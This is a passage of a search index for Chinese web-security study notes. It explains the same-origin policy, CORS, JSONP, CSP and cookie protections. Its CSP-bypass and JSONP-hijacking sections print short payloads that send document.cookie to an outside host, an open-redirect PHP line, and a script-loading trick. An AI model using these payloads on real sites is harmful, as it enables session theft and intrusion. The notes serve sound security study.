2.\u5982\u679c\u6ca1\u6709XMLHttpRequest\uff0c\u5c31\u610f\u5473\u7740\u53ef\u4ee5\u4e00\u4e2a\u9875\u9762\u53ef\u4ee5\u5411\u4efb\u610f\u9875\u9762\u53d1\u8d77HTTP\u8bf7\u6c42\u3002\u90a3\u4e48\u5c31\u4f1a\u5bfc\u81f4\u4ee5\u4e0b\u5b89\u5168\u95ee\u9898: \u5f53\u4e00\u4e2a\u7528\u6237\u767b\u9646\u4e86\u67d0\u4e2a\u7cfb\u7edf\uff0c\u5982\u94f6\u884c\u4e2a\u4eba\u7cfb\u7edf\uff0c\u6b64\u65f6\u94f6\u884c\u7f51\u7ad9\u4f1a\u7ed9\u7528\u6237\u8fd4\u56decookie\u3002\u5982\u679c\u7528\u6237\u6b64\u65f6\u8bbf\u95ee\u4e86\u6211\u4eec\u7684\u6076\u610f\u7f51\u7ad9\uff0c\u5c31\u4f1a\u6267\u884c\u6211\u4eec\u6076\u610f\u7f51\u7ad9\u4e2d\u7684\u6076\u610fAJAX\u4ee3\u7801\uff0c\u6b64AJAX\u4ee3\u7801\u4f1a\u5411\u94f6\u884c\u7f51\u7ad9\u53d1\u8d77HTTP\u8bf7\u6c42\uff0c\u6bd4\u5982\u53d1\u8d77\u67e5\u8be2\u8d26\u6237\u4f59\u989d\u7684\u8bf7\u6c42\uff08\u6b64\u65f6\u4f1a\u9ed8\u8ba4\u9644\u5e26\u7528\u6237\u7684cookie\uff09\u3002\u94f6\u884c\u9875\u9762\u53d1\u73b0cookie\u65e0\u8bef\uff0c\u5c31\u4f1a\u8fd4\u56de\u8bf7\u6c42\u7684\u6570\u636e:\u8d26\u6237\u4f59\u989d\uff0c\u9020\u6210\u6570\u636e\u6cc4\u9732\u3002","title":"\u540c\u6e90\u7b56\u7565\u7684\u4f5c\u7528"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_6","text":"\u4e0a\u9762\u6211\u4eec\u8bf4\u4e86\u540c\u6e90\u7b56\u7565\u4e2d\uff0c\u4e00\u4e2a\u9875\u9762\u4e0d\u80fd\u5bf9\u4e0d\u540c\u6e90\u7684\u9875\u9762\u8fdb\u884c\u64cd\u4f5c\u3002\u4f46\u662f\u5728\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u8fd8\u662f\u6709\u4e00\u4e9bjs\u6807\u7b7e\u80fd\u6446\u8131\u8fd9\u79cd\u675f\u7f1a,\u5982script\u6807\u7b7e\u5c31\u80fd\u901a\u8fc7src\u5c5e\u6027\u83b7\u53d6\u4e0d\u540c\u6e90\u9875\u9762\u4e0a\u7684js\u4ee3\u7801\uff0ciframe\u80fd\u5d4c\u5165\u4e0d\u540c\u6e90\u7ad9\u70b9\u7684\u8d44\u6e90\u7b49\u7b49\u3002 \u8fd9\u6837\u7684\u6807\u7b7e\u6709\u5982\u4e0b <script src=\"...\"></script> <link rel=\"stylesheet\" href=\"...\"> <img> / <video> / <audio> <object> <embed> \u548c <applet> \u7684\u63d2\u4ef6 @font-face <frame> \u548c <iframe> \u4f46\u4ec5\u4ec5\u662f\u8fd9\u6837\uff0c\u6709\u4e9b\u65f6\u5019\u8fd8\u662f\u65e0\u6cd5\u8fbe\u5230\u4e1a\u52a1\u7684\u9700\u6c42\uff0c\u6211\u4eec\u6709\u65f6\u9700\u8981\u7a81\u7834\u8fd9\u79cd\u9650\u5236\u6765\u8fbe\u5230\u4e1a\u52a1\u9700\u6c42\uff0c\u4e5f\u5c31\u662f\u907f\u5f00\u540c\u6e90\u7b56\u7565\uff0c\u4ee5\u4e0b\u662f\u51e0\u79cd\u89e3\u51b3\u65b9\u6848\u3002","title":"\u8de8\u57df"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#cors","text":"CORS\uff0c\u5373\u8de8\u57df\u8d44\u6e90\u5171\u4eab\uff0c\u5b83\u662f\u4e00\u4e2aW3C\u6807\u51c6\uff0c\u5b9a\u4e49\u4e86\u5fc5\u987b\u8bbf\u95ee\u8de8\u57df\u8d44\u6e90\u65f6\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u8be5\u5982\u4f55\u534f\u5546\u3002 \u5176\u5b9e\u8d28\u5c31\u662f\u4ee5AJAX\u4e3a\u8f7d\u4f53\uff0c\u4f7f\u7528\u81ea\u5b9a\u4e49HTTP\u5934\u8ba9\u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u8fdb\u884c\u534f\u5546\uff0c\u4ece\u800c\u51b3\u5b9a\u8de8\u57df\u8bf7\u6c42\u662f\u5426\u5e94\u8be5\u6210\u529f\u3002 \u6240\u4ee5\u5b9e\u73b0CORS\u901a\u4fe1\u7684\u5173\u952e\u662f\u670d\u52a1\u5668\u662f\u5426\u5b9e\u73b0\u4e86CORS\u63a5\u53e3\u3002 \u53e6\u5916\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301CORS\uff0c\u6bd4\u5982IE6,IE7,Opera min \u4e0d\u652f\u6301CORS\u3002","title":"CORS"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_7","text":"\u6d4f\u89c8\u5668\u628aCORS\u7684\u8bf7\u6c42\u5206\u6210\u4e24\u7c7b:\u7b80\u5355\u8bf7\u6c42\u4e0e\u975e\u7b80\u5355\u8bf7\u6c42 \u7b80\u5355\u8bf7\u6c42: \u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff0c\u5373\u4e3a\u7b80\u5355\u8bf7\u6c42 \u8bf7\u6c42\u65b9\u6cd5\u662f\u4ee5\u4e0b\u4e09\u79cd\u65b9\u6cd5\u4e4b\u4e00\uff1a HEAD GET POST \u4e14HTTP\u7684\u5934\u4fe1\u606f\u4e0d\u8d85\u51fa\u4ee5\u4e0b\u51e0\u79cd\u5b57\u6bb5\uff1a Accept Accept-Language Content-Language Last-Event-ID Content-Type\uff1a\u53ea\u9650\u4e8e\u4e09\u4e2a\u503c application/x-www-form-urlencoded\u3001multipart/form-data\u3001text/plain \u53ea\u8981\u4e0d\u6ee1\u8db3\u4ee5\u4e0a\u6761\u4ef6\uff0c\u90fd\u4e3a\u975e\u7b80\u5355\u8bf7\u6c42\u3002 \u5bf9\u4e8e\u7b80\u5355\u8bf7\u6c42\uff0c\u5176\u5b9e\u73b0\u539f\u7406\u5982\u4e0b: 1.\u5728\u8bf7\u6c42\u5934\u4e2d\u52a0\u4e00\u4e2a\u989d\u5916\u5934:Origin, \u5176\u5305\u542b\u53d1\u51fa\u8bf7\u6c42\u7684\u9875\u9762\u7684\u534f\u8bae\uff0c\u57df\u540d\uff0c\u7aef\u53e3\uff0c\u670d\u52a1\u5668\u4ee5\u6b64\u6765\u5224\u65ad\u662f\u5426\u7ed9\u4e88\u54cd\u5e94\u3002 2.\u670d\u52a1\u5668\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5224\u522b\u8be5Origin\u6307\u5411\u7684\u7ad9\u70b9\u80fd\u5426\u8de8\u57df\u3002\u82e5\u80fd\u8de8\u57df\uff0c\u5c31\u5728 Access-Control-Allow-Origin \u5934\u90e8\u4e2d\u56de\u53d1\u76f8\u540c\u7684\u6e90\u4fe1\u606f\uff08\u5982\u679c\u662f\u516c\u5171\u8d44\u6e90\uff0c\u53ef\u4ee5\u56de\u53d1 * \uff09\uff1b\u82e5\u4e0d\u80fd\u8de8\u57df\uff0c\u5219\u6ca1\u6709\u8fd9\u4e2a\u5934\u90e8\u6216\u8005\u6e90\u4fe1\u606f\u4e0d\u5339\u914d\uff08\u5373Access-Control-Allow-Origin\u5185\u5bb9\u975e*\u4e14\u4e0eOrigin\u4e0d\u7b26\uff09 3.\u540c\u65f6\u5982\u679c\u670d\u52a1\u5668\u8fd4\u56de\u7684\u5934\u4e2d\u6709 Access-Control-Allow-Credentials: true \uff0c\u5219\u8bf4\u660e\u53ef\u4ee5\u8de8\u57df\u5411\u670d\u52a1\u5668\u53d1\u9001\u5e26\u6709cookie\u7684HTTP\u8bf7\u6c42\u3002 \u5bf9\u4e8e\u975e\u7b80\u5355\u8bf7\u6c42\uff0c\u5b83\u4f1a\u5b9e\u73b0\u8fdb\u884c\u9884\u68c0\uff0c\u5176\u539f\u7406\u5982\u4e0b: 1.\u8fdb\u884c\u9884\u68c0\uff0c\u4ee5OPTIONS\u65b9\u6cd5\u5411\u670d\u52a1\u5668\u53d1\u9001Origin\u5934\u90e8\uff0cAccess-Control-Request-Method\u5934\u90e8\uff08\u63a5\u4e0b\u6765\u7684\u8bf7\u6c42\u65b9\u6cd5\uff0c\u5982POST\uff09\uff0cAccess-Control-Request-Headers\uff08\u81ea\u5b9a\u4e49\u5934\u90e8\u4fe1\u606f\uff0c\u53ef\u9009\uff09 2.\u670d\u52a1\u5668\u54cd\u5e94\uff0c\u6709\u5982\u4e0b\u5934:Access-Control-Allow-Origin,Access-Control-Allow-Methods(\u5141\u8bb8\u7684\u8bf7\u6c42\u65b9\u6cd5)\uff0cAccess-Control-Allow-Headers\uff08\u5141\u8bb8\u7684\u81ea\u5b9a\u4e49\u5934\u90e8\u4fe1\u606f\uff09\uff0cAccess-Control-Max-Age\uff08\u5e94\u8be5\u5c06\u9884\u68c0\u8bf7\u6c42\u7f13\u5b58\u591a\u957f\u65f6\u95f4\uff0c\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09 3.\u901a\u8fc7\u9884\u68c0\u8bf7\u6c42\u540e\uff0c\u4ee5\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u7684CORS\u8bf7\u6c42\u90fd\u4f1a\u548c\u7b80\u5355\u8bf7\u6c42\u4e00\u6837\u3002","title":"\u5b9e\u73b0\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#jsonp","text":"\u6211\u4eec\u4e0d\u59a8\u901a\u8fc7\u4e00\u4e2a\u4f8b\u5b50\u6765\u7aa5\u89c6JSONP\u7684\u5b9e\u73b0\u539f\u7406\u3002 \u6211\u4eec\u6709\u5982\u4e0b\u6587\u4ef6test.html <html> <head></head> <body> <h1>HI</h1> <script> var fun1=function(data){ alert(data) } </script> <script type=\"text/javascript\" src=\"http://192.168.111.1/a.js\"></script> </body> </html> \u5176\u5305\u542b\u7684a.js\u5982\u4e0b fun1(\"remote data\"); \u8bbf\u95eetest.html\uff0c\u6210\u529f\u89e6\u53d1\u5f39\u7a97\uff0c\u6211\u4eec\u5c06test.html\u4e2d\u7684fun1\u51fd\u6570\u79f0\u4e3a\u56de\u8c03\u51fd\u6570 \u4e8e\u662f\u5c31\u51fa\u73b0\u4e86\u5229\u7528\u8fd9\u79cd\u539f\u7406\u6765\u5b9e\u73b0\u8de8\u57df\u4f20\u8f93\u6570\u636e\u7684\u65b9\u6cd5\uff1aJSONP \u4e0b\u9762\u8bf4\u8bf4JSONP\u7684\u5177\u4f53\u5b9e\u73b0\u6d41\u7a0b: \u5ba2\u6237\u7aef: 1.\u5b9a\u4e49\u83b7\u53d6\u6570\u636e\u540e\u7684\u56de\u8c03\u51fd\u6570 2.\u52a8\u6001\u751f\u6210\u670d\u52a1\u7aefJS\u8fdb\u884c\u5f15\u7528\u7684\u4ee3\u7801 \u5173\u4e8e\u6b64\u5904\u7b2c2\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u8bf4\u9053\u8bf4\u9053\u3002 \u6211\u4eec\u518d\u7528\u8fd9\u4e2a\u65b9\u6cd5\u5b9e\u73b0\u8de8\u57df\u65f6\uff0c\u600e\u4e48\u8ba9\u8fdc\u7a0bJS\u77e5\u9053\u6211\u4eec\u672c\u5730\u7684\u56de\u8c03\u51fd\u6570\u53eb\u4ec0\u4e48\u540d\u5b57\uff1f \u8fd9\u5c31\u9700\u8981\u901a\u8fc7\u4e00\u4e9b\u624b\u6bb5\u52a8\u6001\u751f\u6210\u670d\u52a1\u7aef\u7684JS\u4ee3\u7801\u4e86\u3002 \u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7get\u53c2\u6570\u6765\u63a7\u5236\u5176\u8fd4\u56de\u7684\u672c\u5730\u56de\u8c03\u51fd\u6570\u540d\uff0c\u5982: http://a.com?callback=fun1 \u670d\u52a1\u7aef: \u8fd4\u56de\u7531\u56de\u8c03\u51fd\u6570\u540d\u5305\u88f9\u7684JSON\u6570\u636e\uff0c\u5982 fun1({ \"key1\":\"value1\" }); \u8fd9\u91cc\u4e3a\u4ec0\u4e48\u8981\u7279\u522b\u5f3a\u8c03\u662fJSON\u5462\uff1f\u56e0\u4e3aJSON\u4e0d\u4ec5\u53ef\u4ee5\u7b80\u6d01\u7684\u8868\u8ff0\u590d\u6742\u7684\u6570\u636e\uff0c\u800c\u4e14JS\u539f\u751f\u652f\u6301JSON\uff0c\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u7531\u5904\u7406JSON\u6570\u636e\uff0c\u6240\u4ee5\u670d\u52a1\u7aef\u591a\u4f20\u56deJSON\u6570\u636e\uff0cJSONP\u8fd9\u4e2a\u540d\u5b57\u4e5f\u662f\u8fd9\u4e48\u6765\u7684\u3002","title":"JSONP"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#csp","text":"CSP\uff0c\u5373\u5185\u5bb9\u5b89\u5168\u7b56\u7565\u3002\u5b83\u901a\u8fc7\u767d\u540d\u5355\u7b56\u7565\uff0c\u544a\u8bc9\u5ba2\u6237\u7aef\u54ea\u4e9b\u5916\u90e8\u8d44\u6e90\u53ef\u4ee5\u52a0\u8f7d\u548c\u6267\u884c\u3002 \u540c\u65f6\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cCSP\u76ee\u524d\u67091.0 2.0 3.0 \u7248\u672c\uff0c\u6bcf\u4e2a\u7248\u672c\u7684\u89c4\u5219\u90fd\u6709\u4e0d\u540c","title":"CSP"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#csp_1","text":"CSP\u901a\u8fc7\u5b9a\u4e49\u4e00\u7cfb\u5217\u89c4\u5219\u6765\u5b9e\u73b0\u5b89\u5168\u7ba1\u7406\u3002 \u9996\u5148\u6211\u4eec\u6765\u770b\u770b\u4e00\u6761CSP\u89c4\u5219\u7684\u8303\u4f8b Content-Security-Policy: default-src https://host1.com https://host2.com; frame-src 'none'; object-src 'none' \u591a\u4e2aCSP\u6307\u4ee4\u95f4\u7528\u5206\u53f7\u9694\u5f00\uff0c\u591a\u4e2a\u6307\u4ee4\u503c\u4e4b\u95f4\u7528\u7a7a\u683c\u9694\u5f00 \u4e0b\u9762\u662f\u5404\u4e2a\u6307\u4ee4\u53ca\u5176\u6307\u4ee4\u503c\u7684\u6548\u679c \u6458\u81ea https://blog.csdn.net/qq_37943295/article/details/79978761","title":"CSP\u89c4\u5219"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#csp_2","text":"\u90a3\u4e48\u5982\u4f55\u542f\u7528CSP\u5462\uff1f\u6709\u4e24\u79cd\u65b9\u5f0f 1.\u5728HTTP\u5934\u6dfb\u52a0 \u5728HTTP\u5934\u54cd\u5e94\u6dfb\u52a0content-security-policy\u5934\u5e76\u5199\u5165CSP\u89c4\u5219\u4ee5\u540e\uff0c\u5c31\u80fd\u542f\u7528CSP\u4e86 \u56fe\u5f15\u7528\u4e8e http://www.ruanyifeng.com/blog/2016/09/csp.html 2.\u5728meta\u6807\u7b7e\u91cc\u6dfb\u52a0 \u5411\u5185\u6dfb\u52a0\u5982\u4e0b\u5185\u5bb9 <meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:\"> \u5373\u53ef","title":"\u542f\u7528CSP"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#xss_1","text":"","title":"\u4e00\u4e9b\u5176\u4ed6XSS\u4fdd\u62a4\u673a\u5236"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#x-frame","text":"X-Frame-Options \u662f\u4e00\u4e2a\u54cd\u5e94\u5934\uff0c\u6307\u5b9a\u6b64\u9875\u9762\u80fd\u5426\u5728\\ \u6216\u8005\\ \u4e2d\u63d2\u5165. \u4ed6\u6709\u4e09\u4e2a\u53ef\u9009\u503c: DENY \u9875\u9762\u4e0d\u80fd\u88ab\u5d4c\u5165\u5230\u4efb\u4f55iframe\u6216frame\u4e2d SAMEORIGIN \u9875\u9762\u53ea\u80fd\u88ab\u672c\u7ad9\u9875\u9762\u5d4c\u5165\u5230iframe\u6216\u8005frame\u4e2d ALLOW-FROM uri \u8868\u793a\u8be5\u9875\u9762\u53ef\u4ee5\u5728\u6307\u5b9a\u6765\u6e90\u7684 frame \u4e2d\u5c55\u793a\u3002","title":"X-Frame"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#xss-auditor","text":"","title":"XSS auditor"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#httponly","text":"httponly \u662f\u4e00\u4e2a\u9488\u5bf9cookie\u7684\u4fdd\u62a4\u673a\u5236\u3002 \u5176\u5b9e\u73b0\u539f\u7406\u662f\u5728response\u4e2d\u5bf9\u67d0\u4e00\u9879cookie\u8bbe\u7f6e\u4e3aHTTPONLY=true\uff0c\u4ece\u800c\u4f7f\u8be5cookie\u4e0d\u80fd\u88abdocument.cookie \u8bfb\u53d6\u3002 \u6211\u4eec\u968f\u4fbf\u627e\u4e2a\u7f51\u7ad9\uff0c\u53d1\u73b0\u5176captch_session_v2\u5f00\u542f\u4e86httponly \u968f\u540e\u6211\u4eec\u901a\u8fc7document.cookie\u5c1d\u8bd5\u53bb\u8bfb\u53d6aptch_session_v2\u7684\u503c\uff0c\u53d1\u73b0\u5176\u503c\u5e76\u6ca1\u6709\u51fa\u73b0\u5728\u8fd4\u56de\u5185\u5bb9\u4e2d","title":"httponly"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#htmlspecialchars","text":"htmlspecialchars\u662f\u4e00\u4e2aphp\u51fd\u6570\uff0c\u5b83\u53ef\u4ee5\u5c06\u4e00\u4e9b\u654f\u611f\u5b57\u7b26\u8f6c\u4e49 & (AND) => &amp; \" (\u53cc\u5f15\u53f7) => &quot; (\u5f53ENT_NOQUOTES\u6ca1\u6709\u8bbe\u7f6e\u7684\u65f6\u5019) ' (\u5355\u5f15\u53f7) => &#039; (\u5f53ENT_QUOTES\u8bbe\u7f6e) < (\u5c0f\u4e8e\u53f7) => &lt; > (\u5927\u4e8e\u53f7) => &gt;","title":"htmlspecialchars"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#_8","text":"","title":"\u653b\u51fb\u624b\u6bb5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#bypass-csp","text":"csp\uff0c\u662f\u53ef\u4ee5\u88abbypass\u7684\u3002\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u60f3\u529e\u6cd5bypass csp\u6765\u56de\u4f20cookie 1 default-src 'none'; \u53ef\u4ee5\u901a\u8fc7meta\u6807\u7b7e\u5b9e\u73b0\u91cd\u5b9a\u5411 <meta http-equiv=\"refresh\" content=\"1;url=http://www.xxx.com/x.php?cookie=[cookie]\"> \u5373\uff0c1\u79d2\u540e\u8df3\u8f6c\u81f3\u6307\u5b9aurl 2 script-src \u2018self\u2019 \u2018unsafe-inline\u2019 \u5f00\u653e\u4e86\u5185\u8054\u811a\u672c\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7window.location,windows.open\u6216\u8005meta\u6807\u7b7e\u5b9e\u73b0\u9875\u9762\u8df3\u8f6c\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u52a8\u6001\u521b\u5efa\u5143\u7d20\u5b9e\u73b0\u8df3\u8f6c var a = document.createElement(\"a\"); a.href='http://www.baidu.com'+document.cookie; a.click(); 3 default-src 'self'; script-src 'self' \u9650\u5236\u4e86\u53ea\u80fd\u52a0\u8f7d\u672c\u57dfJS\u811a\u672c\uff0c\u540c\u65f6\u7981\u6b62\u4e86\u5185\u8054\u811a\u672c\u6267\u884c\u3002 \u4e0d\u8fc7\u95ee\u9898\u4e0d\u5927\uff0c\u5982\u679c\u6211\u4eec\u6709\u4e00\u4e2a\u4e0a\u4f20\u70b9\uff0c\u6211\u4eec\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u6076\u610fJS\u6587\u4ef6\uff0c\u4e0a\u4f20\u540e\u5982\u679c\u6211\u4eec\u77e5\u9053\u6b64JS\u6587\u4ef6\u4e0a\u4f20\u4f4d\u7f6e\u4e0e\u6587\u4ef6\u540d\u4e14\u4e0a\u4f20\u7684\u4f4d\u7f6e\u662f\u672c\u57df\uff0c\u7136\u540e\u901a\u8fc7XSS\u5b9e\u73b0\u52a0\u8f7d\u6b64\u6076\u610fJS\u6587\u4ef6\u3002 \u53e6\u5916\u5728CSP1.0\u7248\u672c\u4e2d\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8df3\u8f6c(\u73b0\u5728\u4e0d\u548b\u597d\u7528\u4e86) <link rel=\"prefetch\" href=\"http://xxx.cn\"> (H5\u9884\u52a0\u8f7d) <link rel=\"dns-prefetch\" href=\"http://xxx.cn\"> \uff08DNS\u9884\u52a0\u8f7d\uff09 4 script-src http://www.a.com/b/ \u9650\u5236\u4e86\u53ea\u80fd\u4ece\u67d0\u7279\u5b9a\u8def\u5f84\u53bb\u52a0\u8f7dJS\u811a\u672c \u5bf9\u6b64\u4e00\u822c\u7684\u89e3\u51b3\u65b9\u6cd5\u662f\u770b\u770b\u6b64\u76ee\u5f55\u4e0b\u6709\u6ca1\u6709\u53ef\u63a7\u91cd\u5b9a\u5411\u7684\u6587\u4ef6\uff0c\u6bd4\u5982\u8fd9\u79cd b/302.php <?php Header(\"location: \".$_GET['url'])?> \u6211\u4eec\u5c31\u53ef\u4ee5\u63d2\u5165 <script src=\"b/302.php?url=http://a.com/upload/a.js\"> </script> \u53bb\u52a0\u8f7d\u6211\u4eec\u4e0a\u4f20\u7684JS\u811a\u672c\uff08\u4e0a\u4f20\u70b9\u81ea\u5df1\u627e\uff09","title":"bypass csp"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#jsonp_1","text":"\u7b80\u5355\u8bf4\u4e00\u8bf4 \u9996\u5148\u5b58\u5728\u7f51\u7ad9B\uff0c\u5b83\u5305\u542b\u767b\u5f55\u7528\u6237\u7684ID,passwd\u7b49\u654f\u611f\u4fe1\u606f\u3002\u4e14\u6709\u9875\u9762 http://B.com/user?callback= \u7528\u6765\u8fdb\u884cJSONP\u8de8\u57df\u6570\u636e\u4f20\u8f93ID,PASSWD\u7b49\u4fe1\u606f\uff0c\u8fd9\u662f\u524d\u63d0\u3002 \u7528\u6237\u767b\u5f55B\u540e\uff0c\u6253\u5f00\u4e86\u6211\u4eec\u7684\u6076\u610f\u7f51\u7ad9A.com,A.com\u7684\u5185\u5bb9\u4e3a: <script type=\"text/javascript\" src=\"http://B.com/user?jsonp=Callback\"></script> function Callback(result) { \u5c06\u83b7\u53d6\u5185\u5bb9\u4e0a\u4f20\u81f3\u6076\u610f\u670d\u52a1\u5668\u7684JS\u4ee3\u7801..... } \u90a3\u4e48A\u7f51\u7ad9\u5c31\u4f1a\u5411\u7f51\u7ad9B\u8de8\u57df\u8bf7\u6c42\u5230\u654f\u611f\u4fe1\u606f\uff0c\u5e76\u4e0a\u4f20\u5230\u6076\u610f\u670d\u52a1\u5668\u4fdd\u5b58\u3002 \u8fd9\u5c31\u662fJSONP\u52ab\u6301\uff0c\u6b64\u65b9\u6cd5\u5e38\u7528\u4e8e\u6c34\u5751\u653b\u51fb","title":"JSONP \u52ab\u6301"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/#bypass","text":"https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html","title":"\u5e38\u7528\u89e6\u53d1\u70b9\u4e0ebypass"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/","text":"\u4fe1\u606f\u63a2\u6d4b \u5224\u65ad\u7ec4\u4ef6","title":"\u4fe1\u606f\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/#_1","text":"\u5224\u65ad\u7ec4\u4ef6","title":"\u4fe1\u606f\u63a2\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/%E5%88%A4%E6%96%AD%E7%BB%84%E4%BB%B6/%E5%88%A4%E6%96%AD%E7%BB%84%E4%BB%B6/","text":"\u5224\u65ad\u7ec4\u4ef6 \u5224\u65ad\u76ee\u6807\u73af\u5883\u662fjackson\u8fd8\u662ffastjson 